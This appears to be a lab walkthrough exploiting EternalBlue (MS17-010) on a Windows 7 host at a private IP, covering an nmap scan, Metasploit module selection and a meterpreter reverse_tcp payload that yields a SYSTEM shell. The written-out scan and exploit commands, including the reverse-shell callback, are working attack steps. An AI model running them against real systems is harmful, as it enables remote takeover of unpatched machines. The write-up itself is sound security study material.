# 💣 EternalBlue Exploit – Windows 7 (SMB RCE)

> *“If it’s still running Windows 7 in 2025... well, you know what’s coming.”*

## 🎯 Target Information

**Victim IP**: `192.168.88.130`

**OS**: Windows 7 Ultimate SP1

**Exploit Used**: EternalBlue (MS17-010)

**Toolset**: `nmap`, `Metasploit`

---

## 🔍 Initial Recon

Started with a full TCP scan and aggressive detection:

```bash
nmap -T4 -p- -A 192.168.88.130
```

![image](https://github.com/user-attachments/assets/68cf593e-9047-4174-bf81-ba3669417efc)

### Notable findings:

* Port **445** is open (SMB)
* OS Fingerprinting: **Windows 7 Ultimate 7601 SP1**
* SMB signing: **Disabled** (😬)
* System time and NetBIOS name revealed
* Plenty of exposed MSRPC ports — standard for Windows 7

---

## 📚 Exploit Research

Google confirmed what my gut already suspected — **EternalBlue** still haunts the halls of SMBv1 in 2025.
Found it on Exploit-DB: [exploit-db.com/exploits/42315](https://www.exploit-db.com/exploits/42315)

MS17-010 is a well-known Remote Code Execution flaw in SMBv1, exploited in the wild (e.g., WannaCry). So naturally, it’s a prime candidate.

---

## ⚔️ Attack Execution with Metasploit

Fired up the **Metasploit Framework** and searched for EternalBlue modules:

```bash
search eternalblue
```

Got a match for:

```
exploit/windows/smb/ms17_010_eternalblue
```

### 🔍 Pre-check

Before launching, I used an auxiliary scanner to verify the host’s vulnerability:

![image](https://github.com/user-attachments/assets/06ab439e-ef6d-4950-ab75-b22dc6061b13)

Then loaded the actual exploit module and configured the settings:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.88.130
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your-kali-ip>
run
```

Checked the options one last time (because Metasploit doesn't play nice with typos):

![image](https://github.com/user-attachments/assets/31f3254d-13a4-4167-a318-1c7f26c259db)

---

## 🎯 Exploit Triggered

Ran the exploit — and **meterpreter shell** popped like champagne on root day 🍾

![image](https://github.com/user-attachments/assets/9a04ee5b-a386-4022-bbdb-71983d16ad6a)

Full control of the system with `SYSTEM`-level privileges. Game over.

---

## 🧠 Key Takeaways

* EternalBlue is *still* deadly on unpatched legacy systems.
* Port 445 open on a Windows 7 box? Might as well roll out the red carpet for RCE.
* Even now, Metasploit makes exploitation approachable and lethal.
* Always verify with an auxiliary scan before launching — saves time and keeps things clean.

---

## 🧰 Tools Used

* `nmap`
* `Metasploit Framework`
* EternalBlue exploit: `exploit/windows/smb/ms17_010_eternalblue`

---

## 🏁 Outcome

* Shell obtained via SMBv1 exploit
* SYSTEM-level access achieved
* Box thoroughly compromised
